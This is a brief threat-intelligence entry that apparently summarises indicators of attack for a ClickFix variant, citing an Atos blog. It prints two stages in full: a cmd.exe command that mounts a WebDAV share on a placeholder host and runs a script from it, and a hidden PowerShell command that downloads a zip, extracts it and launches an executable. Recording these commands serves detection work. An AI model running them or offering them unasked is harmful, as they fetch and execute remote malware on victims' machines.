# IoAs Intelligence
## [ClickFix | Atos Blog](https://atos.net/en/lp/cybershield/investigating-a-new-click-fix-variant)

**Stage 1:** Run application executes following command:
```
“cmd.exe” /c net use Z: http://{IP/Domain}/webdav /persistent:no && “Z:\{Filename}.cmd” & net use Z: /delete
```
**Stage 2:** PowerShell Execution to add payload:
```
start “” /min powershell -WindowStyle Hidden -Command “Invoke-WebRequest ‘http://{IP/Domain}/{Filemane}.zip’ -OutFile \”$env:TEMP\{Filename}.zip\”
Expand-Archive \”$env:TEMP\{Filename}.zip\” -DestinationPath \”$env:LOCALAPPDATA\MyApp\” -Force
Start-Process \”$env:LOCALAPPDATA\MyApp\{payload}.exe\””
```
